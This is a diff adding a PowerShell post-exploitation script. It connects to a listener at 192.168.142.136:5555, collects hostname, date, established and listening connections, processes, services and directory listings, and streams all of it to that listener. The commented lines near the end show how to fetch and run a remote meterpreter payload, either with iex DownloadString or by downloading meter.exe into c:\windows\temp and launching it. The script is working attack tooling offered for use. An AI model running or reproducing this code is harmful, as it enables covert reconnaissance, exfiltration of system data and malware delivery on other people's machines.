@@ -1,0 +1,82 @@
+
+####################################
+#Change These to Match Your Listener
+###################################
+$port=5555
+$remoteHost = "192.168.142.136"
+
+#########################
+#Don't Touch This
+########################
+$socket = new-object System.Net.Sockets.TcpClient($remoteHost, $port)
+
+
+#################################################
+#Message to Return...List Some Commands to Return
+#################################################
+#################################################
+#Commands with spaces must be closed in single quotes(exmaple below)
+#Failed Commands just won't return data
+#################################################
+$message = "`n`nIncomming Data`n"
+$message+= "Hostname:  "
+$message+= (hostname)
+$message+= "`nDate:      "
+$message+= (date)
+
+$message+="`n"
+$message+= "`n`n#############################"
+$message+= "`n#     SystemInfo"
+$message+= "`n#############################"
+#$message+= (systeminfo) | Out-String
+
+
+$message+= "`n`n#############################"
+$message+= "`n#     Network Connections"
+$message+= "`n#############################"
+$message+= (netstat -ano | findstr EST) | Out-String
+$message+= (netstat -ano | findstr LIST) | Out-String
+
+
+$message+= "`n`n#############################"
+$message+= "`n#     Processes"
+$message+= "`n#############################"
+$message+= (get-process | select-object id, name, path) | Out-String
+
+
+$message+= "`n`n#############################"
+$message+= "`n#       Services"
+$message+= "`n#############################"
+$message+= (get-service)  | Out-String
+
+$message+= "`n`n#############################"
+$message+= "`n#       Dir Listings"
+$message+= "`n#############################"
+$message+= (get-childitem c:\) | Out-String
+$message+= (get-childitem 'c:\program files') | Out-String
+$message+= (get-childitem 'c:\program files (x86)') | Out-String
+
+$message+= "`nEnd of Data Stream`n" 
+
+#################################################
+#Don't Touch This part Either
+################################################
+$data = [System.Text.Encoding]::ASCII.GetBytes($message)
+$stream = $socket.GetStream()
+$stream.Write($data, 0, $data.Length)
+$stream.close()
+
+
+####################################################################
+#Add any additional powershell commands here, that WON'T return data
+####################################################################
+
+############Example, this line can pick up additional things, like a meterpreter payload....
+#powershell -c "iex(New-Object Net.WebClient).DownloadString('http://192.168.142.134:9595/y')"
+
+
+############iExample Download a meterpreter.exe and run it
+#(New-Object System.Net.WebClient).DownloadFile('http://192.168.142.134:9595/y.exe', "c:\windows\temp\meter.exe")
+#c:\windows\temp\meter.exe
+
+
